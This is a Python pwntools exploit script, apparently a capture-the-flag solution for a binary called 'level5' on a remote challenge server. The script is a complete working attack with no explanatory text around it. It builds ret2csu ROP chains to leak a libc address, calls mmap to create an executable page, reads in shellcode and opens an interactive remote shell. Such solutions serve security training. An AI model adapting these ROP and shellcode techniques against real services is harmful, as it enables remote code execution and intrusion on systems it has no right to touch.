#!/usr/bin/env python
# -*- coding: utf-8 -*-

from pwn import *

context.log_level = 'debug'

context(arch='amd64', os='linux')


EXE_IMG = './level5'
EXE = ELF(EXE_IMG)
ELF_CSU_INIT_POP = 0x4006AA
ELF_CSU_INIT_MOV = 0x400690

BSS = 0x600a88

OFFSET = 0x80
PADDING = 'a' * (OFFSET + 8)

SHELLCODE = asm(shellcraft.sh())
SHELLCODE_ADDR = 0xbeef0000
SHELLCODE_LEN = (len(SHELLCODE) // 8 + 1) * 8  # 8字节对齐，虽然没什么用

class ElfConfig:
    io = remote('pwn2.jarvisoj.com', 9884)
    LIBC_IMG = LIBC_IMG = './libc-2.19.so'
    POP_RDI_RET = 0x22b9a
    POP_RSI_RET = 0x24885
    POP_RDX_RET = 0x1b8e
    POP_RCX_JMP_RAX = 0x1784e1  # 0x001784e1: pop rcx ; jmp qword [rax] ;
    POP_RAX_RET = 0x1b290  # 0x0001b290: pop rax ; ret  ;

    POP_R8_XXX_RET = 0x127786  # 0x00127786: pop r8 ; mov eax, 0x00000001 ; ret  ;
    SHR_R9_XXX_RET = 0x38ba0  # 0x00038ba0: shr r9, cl ; mov qword [rdi+0x08], r9 ; ret  ;

def main():
    env = ElfConfig()
    libc = ELF(env.LIBC_IMG)
    io = env.io
    # 获取 write@libc 地址
    p = PADDING
    p += p64(ELF_CSU_INIT_POP)  # pop rbx ; pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15; ret ;
    p += p64(0)  # rbx
    p += p64(1)  # rbp
    p += p64(EXE.got['write'])  # r12
    p += p64(8)  # r13 -> rdx
    p += p64(EXE.got['write'])  # r14 -> rsi
    p += p64(1)  # r15 -> edi
    p += p64(ELF_CSU_INIT_MOV)  # mov rdx, r13 ; mov rsi, r14 ; mov edi, r15d ; call qword [r12+rbx*8];
    p += 7 * 8 * 'a'
    # 将跳转地址写入 BSS
    p += p64(ELF_CSU_INIT_POP)  # pop rbx ; pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15; ret ;
    p += p64(0)  # rbx
    p += p64(1)  # rbp
    p += p64(EXE.got['read'])  # r12
    p += p64(16)  # r13 -> rdx
    p += p64(BSS)  # r14 -> rsi
    p += p64(0)  # r15 -> edi
    p += p64(ELF_CSU_INIT_MOV)  # mov rdx, r13 ; mov rsi, r14 ; mov edi, r15d ; call qword [r12+rbx*8];
    p += 7 * 8 * 'a'
    p += p64(EXE.symbols['vulnerable_function'])

    log.info('payload({})={}'.format(len(p), repr(p)))

    io.sendafter(':\n', p)

    out = io.recv()

    write_addr = u64(out[:8])
    log.success('write_addr = ' + hex(write_addr))
    libc_base = write_addr - libc.symbols['write']
    log.success('libc_base = ' + hex(libc_base))
    mmap_addr = libc_base + libc.symbols['mmap']
    log.success('mmap_addr = ' + hex(mmap_addr))
    read_addr = libc_base + libc.symbols['read']
    log.success('read_addr = ' + hex(read_addr))
    
    sleep(0.5)
    # 将跳转地址写入 BSS
    p = p64(libc_base + env.SHR_R9_XXX_RET) + p64(libc_base + env.POP_RDX_RET)
    log.info('payload({})={}'.format(len(p), repr(p)))
    io.send(p)

    # void *mmap(void *addr, size_t length, int prot, int flags, int fd, off_t offset);
    # rdi = addr, rsi = length, rdx = prot, rcx = flags, r8 = fd, r9 = offset
    p = PADDING
    # 由于修改r9指令需要修改rdi
    p += p64(libc_base + env.POP_RDI_RET) + p64(BSS + 8)  # mov qword [rdi+0x08], r9 -> r9写在 BSS + 16 的位置上，避免影响前面16位
    # r9根据cl位移，所以需要修改rcx
    p += p64(libc_base + env.POP_RAX_RET) + p64(BSS)  # jmp qword [rax] 保证pop rcx jmp 时能跳转到[bss] SHR_R9_XXX_RET)
    p += p64(libc_base + env.POP_RCX_JMP_RAX) + p64(0xffffffff)
    # r9置0
    p += p64(libc_base + env.POP_R8_XXX_RET) + p64(0)
    p += p64(libc_base + env.POP_RAX_RET) + p64(BSS + 8)  # jmp qword [rax] 保证pop rcx jmp 时能跳转到[bss + 8] POP_RDX_RET
    p += p64(libc_base + env.POP_RCX_JMP_RAX) + p64(0x22)
    p += p64(7)  # -> rdx
    p += p64(libc_base + env.POP_RSI_RET) + p64(SHELLCODE_LEN)
    p += p64(libc_base + env.POP_RDI_RET) + p64(SHELLCODE_ADDR)
    p += p64(mmap_addr)
    p += p64(EXE.symbols['vulnerable_function'])

    log.info('payload({})={}'.format(len(p), repr(p)))
    io.send(p)
    sleep(0.5)
    out = io.recv()

    # 写入shellcode并执行
    p = PADDING
    p += p64(libc_base + env.POP_RDI_RET)
    p += p64(0)
    p += p64(libc_base + env.POP_RSI_RET)
    p += p64(SHELLCODE_ADDR)
    p += p64(libc_base + env.POP_RDX_RET)
    p += p64(len(SHELLCODE))
    p += p64(read_addr)
    p += p64(SHELLCODE_ADDR)

    log.info('payload({})={}'.format(len(p), repr(p)))
    io.send(p)
    sleep(0.5)

    log.info('payload({})={}'.format(len(SHELLCODE), repr(SHELLCODE)))
    io.send(SHELLCODE)
    sleep(0.5)

    io.interactive()

main()
